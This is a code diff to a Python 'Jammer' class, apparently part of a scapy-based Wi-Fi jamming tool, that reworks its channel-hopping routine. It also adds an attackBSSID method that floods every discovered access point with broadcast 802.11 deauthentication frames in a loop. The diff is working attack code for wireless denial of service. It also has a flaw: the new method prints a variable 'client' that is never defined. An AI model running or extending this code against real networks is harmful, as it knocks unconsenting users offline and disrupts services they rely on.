@@ -10,10 +10,16 @@ class Jammer:
         self.NETWORKS = {} #Dictionary to store available accesspoints
         self.ATTACK_STOP = False #Attacking flag
 
-    def get_channel_hop_process(self):
-        return Process(target= self.start_channel_hop)
+    def get_stop_sniff(self):
+        return self.STOP_SNIFF
 
-    def start_channel_hop(self):
+    def get_channel_hop_process(self):
+        return Process(target= self.start_channel_hop, args=(False,) )
+
+    def get_channel_hop_cycle_process(self):
+        return Process(target= self.start_channel_hop, args=(True,) )
+
+    def start_channel_hop(self, oneCycle):
         counterChannel = 1
         while not self.STOP_SNIFF:
             try:
@@ -23,15 +29,15 @@ class Jammer:
                 if counterChannel <= 12:
                     counterChannel+=1
                 else :
-                    counterChannel = 1
+                    if oneCycle:
+                        self.STOP_SNIFF = True
+                    else:
+                        counterChannel = 1
             except KeyboardInterrupt:
                 break
 
     def stop_channel_hop(self):
         self.STOP_SNIFF = False
-
-    def get_channel_hop_status(self):
-        return self.STOP_SNIFF
 
     def sniff(self):
         sniff(
@@ -74,6 +80,17 @@ class Jammer:
         else:
             deauth_pckt_count = int(deauth_pckt_count)
         return Process(target = self.perform_deauth, args=(target_accesspoint, 'FF:FF:FF:FF:FF:FF', deauth_pckt_count))
+
+    def attackBSSID(self):
+        while not self.ATTACK_STOP:
+            try:
+                for bssid in self.NETWORKS:
+                    print("Sending Deauth to %s from %s" % (client, bssid))
+                    pckt =  RadioTap() / Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid) / Dot11Deauth()
+                    sendp(pckt, iface=self.INTERFACE, inter = .01, count=5)
+            except KeyboardInterrupt:
+                self.ATTACK_STOP = True
+
 
     def stop_attack(self):
         self.ATTACK_STOP = True
